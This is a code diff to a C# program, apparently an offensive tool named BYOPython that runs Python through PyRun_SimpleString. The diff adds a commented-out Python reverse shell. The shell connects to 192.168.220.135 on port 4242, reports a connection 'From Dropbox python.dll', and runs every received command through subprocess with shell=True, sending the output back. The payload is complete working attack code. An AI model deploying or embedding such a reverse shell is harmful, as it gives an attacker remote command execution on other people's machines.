@@ -61,6 +61,38 @@ namespace BYOPython
 
             string pythonCode = @"print('Hello from Python')";
 
+            /* Python Reverse shell example from: https://github.com/trackmastersteve/shell/blob/master/shell.py
+            string pythonCode = @"import os,sys
+import socket
+import subprocess
+
+HOST = '192.168.220.135'
+PORT = 4242
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.send(str.encode('[*] Connection Established From Dropbox python.dll \n'))
+
+while 1:
+    try:
+        s.send(str.encode(os.getcwd() + '> '))
+        data = s.recv(1024).decode('UTF-8')
+        data = data.strip('\n')
+        if data == 'quit': 
+            break
+        if data[:2] == 'cd':
+            os.chdir(data[3:])
+        if len(data) > 0:
+            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+            stdout_value = proc.stdout.read() + proc.stderr.read()
+            output_str = str(stdout_value, 'UTF-8')
+            s.send(str.encode('\n' + output_str))
+    except Exception as e:
+        continue
+    
+s.close()";
+            */
+
             Console.WriteLine($"[+] Executing Python Payload.");
 
             int result = PyRun_SimpleString(pythonCode);
